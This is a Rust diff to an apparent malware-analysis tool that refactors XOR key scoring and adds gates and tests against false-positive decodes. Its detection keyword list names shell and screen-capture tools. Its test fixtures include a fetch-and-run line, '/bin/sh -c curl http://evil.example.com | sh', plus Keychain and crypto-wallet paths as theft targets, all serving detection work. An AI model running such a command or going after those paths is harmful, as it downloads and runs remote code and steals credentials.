@@ -6,8 +6,8 @@
 use super::key::{calculate_entropy, is_good_xor_key_candidate, score_xor_key_candidate};
 use super::scan::{XOR_PATTERNS, extract_custom_xor_strings};
 use super::validate::{
-    has_known_path_prefix, is_locale_string, is_meaningful_string, is_printable_char, is_valid_ip,
-    is_valid_port, is_valid_xor_string, looks_like_text,
+    has_known_path_prefix, is_locale_string, is_meaningful_string,
+    is_printable_char, is_valid_ip, is_valid_port, is_valid_xor_string, looks_like_text,
 };
 use super::{MAX_AUTO_DETECT_SIZE, MAX_XOR_SCAN_SIZE, SKIP_XOR_KEYS};
 use crate::{ExtractedString, StringKind, StringMethod, classifier::classify_string};
@@ -153,6 +153,154 @@ pub(crate) fn clean_url_trailing_garbage(url: &str) -> String {
     url.to_string()
 }
 
+/// A candidate key whose full extraction yields more strings than this is
+/// noise, not a key: real XOR'd payloads decode a bounded set of strings,
+/// while a coincidental key over printable data "decodes" strings everywhere
+/// (any ASCII-preserving key turns megabytes of text into printable runs).
+pub(crate) const MAX_XOR_KEY_RESULTS: usize = 5000;
+
+/// Minimum weighted quality score for accepting an XOR key.
+/// Any key produces ~85% printable output, so acceptance needs EXTREMELY
+/// strong evidence: 375 = 5 unique suspicious paths at 75 pts each. This
+/// rejects keys that score only from a handful of garbled path matches
+/// (null-byte false positives) while accepting real malware, which typically
+/// has explicit shell commands (100+ pts), C2 URLs, or crypto wallet paths.
+pub(crate) const MIN_XOR_KEY_SCORE: i32 = 375;
+
+/// Letter density a decoded indicator must reach before its kind earns points
+/// toward accepting an XOR key. Real paths, commands and hosts are built from
+/// words; the shape classifiers' false positives are punctuation soup that
+/// merely starts with `/` or contains a dot.
+const MIN_SCOREABLE_LETTER_DENSITY: u32 = 60;
+
+/// True if a decoded string reads like genuinely recovered text, and so may
+/// contribute its kind's points to a candidate key's score.
+///
+/// The kind classifiers are deliberately shape-based ("starts with `/`", "has
+/// dots"), which is right for extraction but too permissive for *key
+/// acceptance*: a coincidental key smears a benign file's own text into
+/// printable junk like `/s.<j6:|FKK=7+U@E`, which classifies as a suspicious
+/// path and would otherwise vote for its own key.
+fn value_reads_as_recovered_text(s: &ExtractedString) -> bool {
+    if !is_meaningful_string(&s.value) {
+        return false;
+    }
+    // Network-address indicators are legitimately letter-free (`192.168.1.100`),
+    // and their classifiers validate structure rather than shape.
+    if matches!(s.kind, Some(StringKind::IP) | Some(StringKind::IPPort)) {
+        return true;
+    }
+    letter_density(s.value.as_bytes()) >= MIN_SCOREABLE_LETTER_DENSITY
+}
+
+/// Weighted quality score of a candidate XOR key's decoded strings.
+///
+/// Uses a set of already-scored values to avoid counting duplicate strings
+/// multiple times: real XOR keys decode to diverse content, but false-positive
+/// keys (e.g., a library path XOR'd with near-zero code) produce repetitive
+/// garbled copies of the key text that would otherwise inflate the score.
+/// `key_str` is the key's printable representation, used to reject garbled
+/// echoes of the key itself (see [`value_is_key_echo`]).
+pub(crate) fn score_xor_results(results: &[ExtractedString], key_str: &str) -> i32 {
+    let mut score = 0;
+    let mut scored_values: HashSet<String> = HashSet::new();
+    let key_lower = key_str.to_ascii_lowercase();
+
+    for r in results {
+        let value_lower = r.value.to_ascii_lowercase();
+
+        // Skip results that are merely garbled echoes of the key. When the
+        // scanner derives a key from a token that repeats throughout a benign,
+        // text-rich input (e.g. an OpenAPI schema repeating "OAuth2Authorization
+        // Code"), XORing smears shards of the key across the output. Those shards
+        // trip the short-keyword IOC classifiers ("auth", "key", "user", ...) and
+        // would otherwise inflate the score past the confidence threshold. A real
+        // key is high-entropy bytes whose windows never appear in genuinely
+        // decoded plaintext, so true positives are unaffected. This generalizes
+        // the exact-duplicate dedup above to near-duplicate key fragments.
+        if value_is_key_echo(&value_lower, &key_lower) {
+            continue;
+        }
+
+        // CRITICAL: Shell commands and redirections (highest priority)
+        if value_lower.contains("osascript")
+            || value_lower.contains("screencapture")
+            || value_lower.contains("/bin/sh")
+            || value_lower.contains("/bin/bash")
+            || value_lower.contains("2>&1")
+            || value_lower.contains("<<eod")
+            || value_lower.contains("<<eof")
+        {
+            score += 100;
+        }
+
+        // Cryptocurrency terms (very high priority) - keywords are already lowercase
+        for crypto in CRYPTO_KEYWORDS {
+            if value_lower.contains(crypto) {
+                score += 80;
+                break;
+            }
+        }
+
+        let kind_scoreable = value_reads_as_recovered_text(r);
+
+        // Suspicious paths (very high priority) - only count unique values
+        if kind_scoreable
+            && matches!(r.kind, Some(StringKind::SuspiciousPath))
+            && scored_values.insert(value_lower.clone())
+        {
+            score += 75;
+        }
+
+        // URLs and network indicators - only count unique values
+        if kind_scoreable
+            && matches!(
+                r.kind,
+                Some(StringKind::Url) | Some(StringKind::IP) | Some(StringKind::IPPort)
+            )
+            && scored_values.insert(value_lower.clone())
+        {
+            score += 50;
+        }
+
+        // Browser strings - keywords are already lowercase
+        for browser in BROWSER_KEYWORDS {
+            if value_lower.contains(browser) {
+                score += 40;
+                break;
+            }
+        }
+
+        // Shell commands - only count unique values
+        if kind_scoreable
+            && matches!(r.kind, Some(StringKind::ShellCmd))
+            && scored_values.insert(value_lower.clone())
+        {
+            score += 30;
+        }
+
+        // Locale strings (en-US, ru-RU pattern)
+        if is_locale_string(&r.value) {
+            score += 25;
+        }
+
+        // Generic paths (lower priority, only if they match known prefixes)
+        if kind_scoreable
+            && matches!(r.kind, Some(StringKind::Path))
+            && has_known_path_prefix(&r.value)
+        {
+            score += 10;
+        }
+
+        // Base64 (low priority)
+        if matches!(r.kind, Some(StringKind::Base64)) {
+            score += 5;
+        }
+    }
+
+    score
+}
+
 /// True if `value_lower` contains any 4-character alphanumeric window of
 /// `key_lower` — meaning the "decoded" string is just a garbled copy of the key
 /// (a self-XOR artifact), not genuine recovered plaintext. Both arguments must
@@ -277,101 +425,11 @@ pub(crate) fn auto_detect_xor_key(
             let results = extract_custom_xor_strings(data, &key, min_length, true);
 
             // Sanity check: if we extracted way too many strings, it's likely noise
-            if results.len() > 5000 {
+            if results.len() > MAX_XOR_KEY_RESULTS {
                 return None;
             }
 
-            // Calculate weighted score based on decoded string quality.
-            // Use a set of already-scored values to avoid counting duplicate strings
-            // multiple times: real XOR keys decode to diverse content, but false-positive
-            // keys (e.g., a library path XOR'd with near-zero code) produce repetitive
-            // garbled copies of the key text that would otherwise inflate the score.
-            let mut score = 0;
-            let mut scored_values: HashSet<String> = HashSet::new();
-            let key_lower = candidate.to_ascii_lowercase();
-
-            for r in &results {
-                let value_lower = r.value.to_ascii_lowercase();
-
-                // Skip results that are merely garbled echoes of the key. When the
-                // scanner derives a key from a token that repeats throughout a benign,
-                // text-rich input (e.g. an OpenAPI schema repeating "OAuth2Authorization
-                // Code"), XORing smears shards of the key across the output. Those shards
-                // trip the short-keyword IOC classifiers ("auth", "key", "user", ...) and
-                // would otherwise inflate the score past the confidence threshold. A real
-                // key is high-entropy bytes whose windows never appear in genuinely
-                // decoded plaintext, so true positives are unaffected. This generalizes
-                // the exact-duplicate dedup above to near-duplicate key fragments.
-                if value_is_key_echo(&value_lower, &key_lower) {
-                    continue;
-                }
-
-                // CRITICAL: Shell commands and redirections (highest priority)
-                if value_lower.contains("osascript")
-                    || value_lower.contains("screencapture")
-                    || value_lower.contains("/bin/sh")
-                    || value_lower.contains("/bin/bash")
-                    || value_lower.contains("2>&1")
-                    || value_lower.contains("<<eod")
-                    || value_lower.contains("<<eof")
-                {
-                    score += 100;
-                }
-
-                // Cryptocurrency terms (very high priority) - keywords are already lowercase
-                for crypto in CRYPTO_KEYWORDS {
-                    if value_lower.contains(crypto) {
-                        score += 80;
-                        break;
-                    }
-                }
-
-                // Suspicious paths (very high priority) - only count unique values
-                if matches!(r.kind, Some(StringKind::SuspiciousPath))
-                    && scored_values.insert(value_lower.clone())
-                {
-                    score += 75;
-                }
-
-                // URLs and network indicators - only count unique values
-                if matches!(
-                    r.kind,
-                    Some(StringKind::Url) | Some(StringKind::IP) | Some(StringKind::IPPort)
-                ) && scored_values.insert(value_lower.clone())
-                {
-                    score += 50;
-                }
-
-                // Browser strings - keywords are already lowercase
-                for browser in BROWSER_KEYWORDS {
-                    if value_lower.contains(browser) {
-                        score += 40;
-                        break;
-                    }
-                }
-
-                // Shell commands - only count unique values
-                if matches!(r.kind, Some(StringKind::ShellCmd))
-                    && scored_values.insert(value_lower.clone())
-                {
-                    score += 30;
-                }
-
-                // Locale strings (en-US, ru-RU pattern)
-                if is_locale_string(&r.value) {
-                    score += 25;
-                }
-
-                // Generic paths (lower priority, only if they match known prefixes)
-                if matches!(r.kind, Some(StringKind::Path)) && has_known_path_prefix(&r.value) {
-                    score += 10;
-                }
-
-                // Base64 (low priority)
-                if matches!(r.kind, Some(StringKind::Base64)) {
-                    score += 5;
-                }
-            }
+            let score = score_xor_results(&results, candidate);
 
             Some((score, offset, candidate.to_string(), key))
         })
@@ -393,17 +451,7 @@ pub(crate) fn auto_detect_xor_key(
         }
     }
 
-    // Require VERY high score to avoid false positives from random XOR keys
-    // Any key produces ~85% printable output, so we need EXTREMELY strong evidence
-    // Minimum threshold: 300+ (2+ shell commands, multiple high-value IOCs, or clusters of URLs/IPs)
-    // This filters out unobfuscated binaries - real XOR'd malware will have explicit
-    // command & control URLs, shell commands, or cryptocurrency wallet paths.
-    // Threshold is 375 (= 5 unique suspicious paths at 75 pts each). This rejects keys
-    // that score only from a handful of garbled path matches (null-byte false positives)
-    // while accepting real malware which typically has shell commands (100+ pts) or URLs.
-    let min_xor_confidence_threshold = 375;
-
-    if best_score >= min_xor_confidence_threshold {
+    if best_score >= MIN_XOR_KEY_SCORE {
         if let Some((ref _key, ref key_str, _)) = best_key {
             tracing::info!(
                 "Auto-detected XOR key: '{}' (score: {})",
@@ -456,8 +504,18 @@ pub(crate) fn extract_xor_strings(
         } else {
             expand_xor_string(data, pos, info.key, min_length)
         };
+        // `classify_xor_string` has three outcomes: rejected (`None`), accepted
+        // and identified (`Some(Some(kind))`), and accepted but unidentified
+        // (`Some(None)`). An identified decode — a URL, path, command, host —
+        // stands on its own. A decode that names nothing has only the claim
+        // that it revealed hidden text, so require its source to have actually
+        // been hidden: opaque bytes, not readable ASCII. That keeps the real
+        // unidentified finds (a XOR'd user agent sits among NULs and control
+        // bytes in a binary) and drops trigger-pattern coincidences inside
+        // ordinary source text, where nothing was concealed to begin with.
         if let Some((decoded, start, end)) = expanded
             && let Some(kind) = classify_xor_string(&decoded)
+            && (kind.is_some() || raw_region_is_opaque(&data[start..end]))
         {
             let offset = start as u64;
             if seen.insert((offset, decoded.clone())) {
@@ -920,6 +978,52 @@ fn distinct_bytes(buf: &[u8; 8]) -> usize {
         .count()
 }
 
+/// Distinct common words a raw region must contain before it counts as
+/// Fraction of bytes that are letters or spaces, in percent — a cheap,
+/// language-agnostic measure of how much a byte run reads like text. Words in
+/// any Latin-script language and in source code are letter-dominant, whereas
+/// XOR-smeared text lands mostly in the punctuation and digit ranges, because
+/// XORing a letter with a typical key moves it out of the letter bands.
+fn letter_density(bytes: &[u8]) -> u32 {
+    if bytes.is_empty() {
+        return 0;
+    }
+    let letters = bytes
+        .iter()
+        .filter(|b| b.is_ascii_alphabetic() || **b == b' ')
+        .count();
+    u32::try_from(letters * 100 / bytes.len()).unwrap_or(100)
+}
+
+/// True when the source bytes are opaque — not something a reader could have
+/// read without decoding.
+///
+/// This is what obfuscation looks like from the outside: hidden text sits in
+/// runs containing control bytes, NULs or high bytes, because the whole point
+/// is that the string is not visible in the file. A run of pure printable
+/// ASCII is, by contrast, already readable — nothing was hidden in it.
+fn raw_region_is_opaque(raw: &[u8]) -> bool {
+    raw.iter()
+        .any(|&b| !(b.is_ascii_graphic() || b == b' ') || b == 0)
+}
+
+/// True when XORing this region *destroys* text rather than revealing it —
+/// i.e. the raw bytes already read at least as much like language as the
+/// decode does.
+///
+/// This is the discriminator between a genuine hidden payload and a
+/// coincidental collision. Any large text file contains some byte run that
+/// matches one of the short trigger patterns (`://`, `.exe`, …) XOR'd with one
+/// of 254 keys, and since printable ^ key often stays printable, expansion
+/// then yields plausible-looking junk from ordinary source code. Printability
+/// alone cannot separate the two cases — a genuinely XOR'd `http://evil.com`
+/// under key 0x42 encodes to punctuation that is still ASCII-graphic — but the
+/// *direction* of the transformation can: a real decode turns unreadable bytes
+/// into words, while a false positive turns words into unreadable bytes.
+fn xor_destroys_text(raw: &[u8], decoded: &str) -> bool {
+    letter_density(raw) >= letter_density(decoded.as_bytes())
+}
+
 /// Expand outward from a match position to find the full XOR'd string.
 pub(crate) fn expand_xor_string(
     data: &[u8],
@@ -993,6 +1097,13 @@ pub(crate) fn expand_xor_string(
 
     // Reject if the original string fails validation (garbage decode).
     if !is_valid_xor_string(&s) {
+        return None;
+    }
+
+    // Reject decodes that destroy text instead of revealing it — the source
+    // bytes were already more readable than the result (see
+    // [`xor_destroys_text`]).
+    if xor_destroys_text(&data[start..end], &s) {
         return None;
     }
 
@@ -1884,8 +1995,171 @@ pub(crate) fn classify_xor_string(s: &str) -> Option<Option<StringKind>> {
 #[cfg(test)]
 mod tests {
     use super::{
-        clean_url_trailing_garbage, extract_ip_at_dot, looks_like_data_table, value_is_key_echo,
+        MIN_XOR_KEY_SCORE, clean_url_trailing_garbage, extract_ip_at_dot, extract_xor_strings,
+        letter_density, looks_like_data_table, raw_region_is_opaque, score_xor_results,
+        value_is_key_echo, xor_destroys_text,
     };
+    use crate::{ExtractedString, StringKind, StringMethod};
+
+    /// Hide `plaintext` at `offset` inside NUL padding, XOR'd with `key` —
+    /// the shape XOR'd strings take in a real binary.
+    fn hidden_in_binary(plaintext: &[u8], key: u8, offset: usize) -> Vec<u8> {
+        let mut data = vec![0x00; offset];
+        data.extend(plaintext.iter().map(|b| b ^ key));
+        data.extend(std::iter::repeat_n(0x00, 32));
+        data
+    }
+
+    // ---- letter_density -------------------------------------------------
+
+    #[test]
+    fn letter_density_measures_letters_and_spaces() {
+        assert_eq!(letter_density(b"abcd"), 100);
+        assert_eq!(letter_density(b"ab cd"), 100);
+        assert_eq!(letter_density(b"ab12"), 50);
+        assert_eq!(letter_density(b"!@#$"), 0);
+        assert_eq!(letter_density(b""), 0, "empty region must not divide by zero");
+    }
+
+    // ---- xor_destroys_text ----------------------------------------------
+
+    #[test]
+    fn xor_destroys_text_rejects_decoding_readable_source_into_junk() {
+        // Minified JavaScript XOR'd into punctuation soup: the source was the
+        // readable side, so this "decode" hid text rather than revealing it.
+        let raw = b"function(e,t){return e.length}";
+        let decoded: String = raw.iter().map(|b| (b ^ 0x1a) as char).collect();
+        assert!(
+            xor_destroys_text(raw, &decoded),
+            "smearing readable source into junk must be rejected; decoded={decoded:?}"
+        );
+    }
+
+    #[test]
+    fn xor_destroys_text_keeps_decoding_junk_into_readable_text() {
+        let plaintext = "https://example.com/payload";
+        let raw: Vec<u8> = plaintext.bytes().map(|b| b ^ 0x1a).collect();
+        assert!(
+            !xor_destroys_text(&raw, plaintext),
+            "recovering readable text from opaque bytes must be kept"
+        );
+    }
+
+    // ---- raw_region_is_opaque -------------------------------------------
+
+    #[test]
+    fn raw_region_is_opaque_rejects_plain_ascii_source() {
+        assert!(
+            !raw_region_is_opaque(b"const handler = require('./handler');"),
+            "readable ASCII source hides nothing"
+        );
+    }
+
+    #[test]
+    fn raw_region_is_opaque_accepts_control_nul_and_high_bytes() {
+        assert!(raw_region_is_opaque(b"abc\x07def"), "control byte is opaque");
+        assert!(raw_region_is_opaque(b"abc\x00def"), "NUL is opaque");
+        assert!(raw_region_is_opaque(b"abc\xffdef"), "high byte is opaque");
+    }
+
+    // ---- extract_xor_strings: end-to-end behaviour of the gates ----------
+
+    #[test]
+    fn hidden_url_in_binary_padding_is_recovered() {
+        let data = hidden_in_binary(b"http://evil.example.com/beacon", 0x42, 40);
+        let found = extract_xor_strings(&data, 10, false);
+        assert!(
+            found.iter().any(|s| s.value.contains("evil.example.com")),
+            "a URL hidden in NUL padding must still be recovered: {found:?}"
+        );
+    }
+
+    #[test]
+    fn unidentified_decode_from_opaque_bytes_is_kept() {
+        // A user agent names no URL/path/host, so it lands in the
+        // unidentified tier — but its source bytes are genuinely opaque.
+        let data = hidden_in_binary(
+            b"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Safari/537.36",
+            0x42,
+            64,
+        );
+        let found = extract_xor_strings(&data, 10, false);
+        assert!(
+            found.iter().any(|s| s.value.contains("Mozilla")),
+            "opaque source keeps an unidentified but real decode: {found:?}"
+        );
+    }
+
+    #[test]
+    fn benign_source_text_yields_no_xor_strings() {
+        // The gauntlet-fp-small regression: a bundled JavaScript file is
+        // megabytes of printable ASCII, so the short trigger patterns (`://`,
+        // `.exe`, …) collide with some key by chance and every collision used
+        // to expand into a "decoded" string. Nothing here is obfuscated, so
+        // nothing should be reported.
+        let mut source = String::new();
+        for i in 0..400 {
+            source.push_str(&format!(
+                "function handler{i}(request, response) {{ return fetch('https://api.example.com/v1/items?page={i}').then(r => r.json()); }}\n"
+            ));
+        }
+        let found = extract_xor_strings(source.as_bytes(), 10, false);
+        assert!(
+            found.is_empty(),
+            "benign printable source must not produce XOR decodes, got {}: {:?}",
+            found.len(),
+            &found[..found.len().min(5)]
+        );
+    }
+
+    // ---- score_xor_results ----------------------------------------------
+
+    fn decoded(value: &str, kind: Option<StringKind>) -> ExtractedString {
+        ExtractedString {
+            value: value.to_string(),
+            data_offset: 0,
+            data_len: 0,
+            method: StringMethod::XorDecode,
+            kind,
+            fragments: None,
+        }
+    }
+
+    #[test]
+    fn score_ignores_unreadable_values_that_carry_a_kind() {
+        // Shape-based classifiers accept punctuation soup that merely starts
+        // with `/`. Such values must not buy a key its acceptance score.
+        let junk: Vec<ExtractedString> = (0..20)
+            .map(|i| {
+                decoded(
+                    &format!("/s.<j6:|FKK=7+U@E=6+OTK=5zz.<qfu'P}}b+w_s+`_s:qb{i}"),
+                    Some(StringKind::SuspiciousPath),
+                )
+            })
+            .collect();
+        assert!(
+            score_xor_results(&junk, "k") < MIN_XOR_KEY_SCORE,
+            "unreadable pseudo-paths must not reach the acceptance threshold"
+        );
+    }
+
+    #[test]
+    fn score_accepts_genuine_recovered_indicators() {
+        let real = vec![
+            decoded("/Users/victim/Library/Keychains", Some(StringKind::SuspiciousPath)),
+            decoded(
+                "/Users/victim/Library/Application Support/Exodus",
+                Some(StringKind::SuspiciousPath),
+            ),
+            decoded("/bin/sh -c curl http://evil.example.com | sh", Some(StringKind::ShellCmd)),
+            decoded("http://evil.example.com/gate.php", Some(StringKind::Url)),
+            decoded("osascript -e 'display dialog'", Some(StringKind::ShellCmd)),
+        ];
+        assert!(
+            score_xor_results(&real, "k") >= MIN_XOR_KEY_SCORE,
+            "genuinely recovered malware indicators must clear the threshold"
+        );
+    }
 
     #[test]
     fn clean_url_trailing_garbage_handles_multibyte_domain_url() {
